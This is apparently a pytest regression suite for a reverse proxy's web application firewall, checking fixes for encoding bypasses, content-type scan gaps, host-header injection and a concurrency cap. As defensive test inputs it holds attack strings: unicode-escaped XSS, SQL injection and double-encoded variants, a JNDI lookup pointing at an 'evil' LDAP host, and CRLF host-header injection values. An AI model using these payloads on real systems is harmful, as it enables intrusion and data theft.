"""
Regression guards for the 1.9.8 security-review Medium fixes M3/M4/M5/M7.

  M3 (CWE-184)  — WAF body bypass via JSON unicode escapes / double percent-encode.
  M4 (CWE-693)  — WAF body scan skipped for non-allowlisted Content-Types.
  M5 (CWE-644)  — host-header injection reflected to upstream / rewritten Location.
  M7 (CWE-400)  — no concurrent in-flight request cap (memory-exhaustion DoS).
"""
import re
from pathlib import Path

import pytest

import config as c

_REPO = Path(__file__).resolve().parent.parent


@pytest.fixture
def waf_on(monkeypatch):
    monkeypatch.setattr(c, "BODY_PATTERN_MATCH", True, raising=False)
    for g in ("RCE", "CMD", "SQLI", "XSS", "LFI", "SSRF"):
        monkeypatch.setattr(c, f"BODY_GROUP_{g}_ENABLED", True, raising=False)
    yield


# ── M3: unicode / percent-encoding normalization ──────────────────────────────
def test_m3_json_unicode_xss_caught(waf_on):
    body = b'{"q":"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}'
    assert c.match_body_group(body, "application/json") == "xss"


def test_m3_json_unicode_sqli_caught(waf_on):
    body = b'{"id":"1\\u0027 UNION SELECT pw FROM users--"}'
    assert c.check_always_body(body, "application/json") is True


def test_m3_double_percent_encoded_form_caught(waf_on):
    # %2527 -> %27 -> ' after iterative decode
    body = b"name=%2527%2520OR%25201%253D1"
    assert c.is_suspicious_body(body, "application/x-www-form-urlencoded") \
        or c.match_body_group(body, "application/x-www-form-urlencoded")


# ── M4: content-type coverage + binary false-positive guard ───────────────────
def test_m4_octet_stream_body_is_scanned(waf_on):
    body = b"{\"id\":\"1' UNION SELECT password FROM users--\"}"
    assert c.check_always_body(body, "application/octet-stream") is True


def test_m4_missing_content_type_textual_scanned(waf_on):
    body = b"{\"x\":\"${jndi:ldap://evil/a}\"}"
    assert c.check_always_body(body, "") is True


def test_m4_binary_media_skipped_no_false_positive():
    png = b"\x89PNG\r\n\x1a\n" + bytes(range(256)) * 8
    assert c._waf_samples(png, "image/png") == []
    assert c.check_always_body(png, "image/png") is False


def test_m4_clean_json_not_flagged(waf_on):
    assert c.match_body_group(b'{"q":"hello world"}', "application/json") is None


def test_m4_looks_textual_heuristic():
    assert c._looks_textual(b'{"a":1}') is True
    assert c._looks_textual("héllo".encode("utf-8")) is True
    assert c._looks_textual(b"\x89PNG\r\n\x1a\n" + bytes(range(256))) is False
    assert c._looks_textual(b"") is False


# ── M5: safe client-host reflection ───────────────────────────────────────────
def test_m5_safe_client_host(monkeypatch):
    import core.proxy_handler as ph
    UP = "up.internal:8443"
    # default (no allowlist): valid host reflected, malformed → upstream netloc
    monkeypatch.setattr(ph, "ALLOWED_HOSTS", set(), raising=False)
    assert ph._safe_client_host("example.com", UP) == "example.com"
    assert ph._safe_client_host("example.com:8080", UP) == "example.com:8080"
    for bad in ("evil.com/path", "evil.com\r\nSet-Cookie: x=1",
                "user@evil.com", "http://evil.com", "evil com", ""):
        assert ph._safe_client_host(bad, UP) == UP, f"{bad!r} must fall back"
    # allowlist mode: only listed hosts reflected
    monkeypatch.setattr(ph, "ALLOWED_HOSTS", {"good.com"}, raising=False)
    assert ph._safe_client_host("good.com", UP) == "good.com"
    assert ph._safe_client_host("bad.com", UP) == UP


def test_m5_proxy_uses_safe_client_host_at_both_sites():
    src = (_REPO / "core" / "proxy_handler.py").read_text(encoding="utf-8")
    assert src.count("_safe_client_host(request.host") >= 2, \
        "both X-Forwarded-Host and Location-rewrite must use _safe_client_host (M5)"
    assert 'fwd_headers["X-Forwarded-Host"] = request.host' not in src, \
        "raw request.host must no longer be reflected to upstream"


# ── M7: concurrency cap ───────────────────────────────────────────────────────
def test_m7_concurrency_guard_503_over_cap():
    import asyncio
    import proxy as p

    async def _h(_req):
        return "OK"

    async def go():
        p._inflight_requests = p.MAX_CONCURRENT_REQUESTS  # at the ceiling
        r = await p.concurrency_guard(object(), _h)
        assert getattr(r, "status", None) == 503, "must 503 when at the cap"
        p._inflight_requests = 0
        assert await p.concurrency_guard(object(), _h) == "OK"
        assert p._inflight_requests == 0, "counter must be released"
    asyncio.run(go())


def test_m7_guard_wired_early():
    src = (_REPO / "proxy.py").read_text(encoding="utf-8")
    m = re.search(r"middlewares=\[([^\]]+)\]", src)
    assert m, "make_app must declare a middlewares list"
    order = [x.strip() for x in m.group(1).split(",") if x.strip()]
    # security_headers stays outermost (stamps 503s); concurrency_guard is the
    # next one in so the cap still rejects early.
    assert order[0] == "security_headers" and order[1] == "concurrency_guard", \
        f"expected [security_headers, concurrency_guard, ...], got {order}"
